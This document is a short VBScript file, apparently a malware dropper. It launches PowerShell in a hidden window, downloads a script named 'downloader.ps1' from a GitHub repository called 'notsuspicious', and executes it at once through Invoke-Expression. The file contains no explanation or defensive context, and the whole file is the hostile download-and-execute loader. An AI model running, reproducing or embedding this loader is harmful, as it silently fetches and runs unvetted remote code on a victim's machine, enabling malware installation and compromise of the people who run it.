Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -WindowStyle Hidden -Command ""Invoke-Expression ((Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1' -UseBasicParsing).Content)""", 0, True
